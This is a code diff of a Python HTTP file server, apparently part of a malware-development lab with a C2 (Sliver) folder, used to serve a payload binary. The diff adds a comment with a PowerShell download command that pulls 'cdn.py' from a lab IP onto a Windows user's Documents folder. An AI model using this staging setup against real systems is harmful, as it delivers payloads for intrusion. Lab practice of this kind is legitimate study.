@@ -3,7 +3,7 @@ import http.server
 import socketserver
 
 PORT = 8000
-DIRECTORY = "C:\\Users\\test\\Desktop\\mal-dev-lab\\c2\\files"  # Carpeta con el binario que quieres servir
+DIRECTORY = "/home/llorens/projects/mal-dev-lab/c2-sliver/mocks/"  # Carpeta con el binario que quieres servir
 
 class Handler(http.server.SimpleHTTPRequestHandler):
     def __init__(self, *args, **kwargs):
@@ -12,3 +12,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
 with socketserver.TCPServer(("", PORT), Handler) as httpd:
     print(f"Servidor escuchando en el puerto {PORT}")
     httpd.serve_forever()
+
+
+# PS C:\Users\test> IWR http://172.16.41.1:8000/cdn.py -O "C:\Users\test\Documents\cdn.py"
